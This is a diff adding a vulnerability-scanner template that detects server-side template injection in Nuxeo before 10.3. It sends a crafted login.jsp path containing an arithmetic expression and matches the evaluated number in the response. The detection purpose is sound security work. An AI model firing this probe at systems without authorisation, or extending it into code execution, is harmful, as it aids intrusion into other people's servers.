@@ -1,0 +1,27 @@
+id: "nuxeo-ssti-rce"
+name: "Nuxeo <10.3 - Remote Code Execution"
+severity: "high"
+description: "Nuxeo prior to version 10.3 is susceptible to an unauthenticated remote code execution vulnerability via server-side template injection."
+tech:
+  - "tomcat"
+  - "java"
+tags:
+  - "nuxeo"
+  - "ssti"
+  - "rce"
+  - "bypass"
+  - "vuln"
+reference: "https://nvd.nist.gov/vuln/detail/CVE-2018-16299"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/nuxeo/login.jsp/pwn${31333333330+7}.xhtml"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "or"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "31333333337"
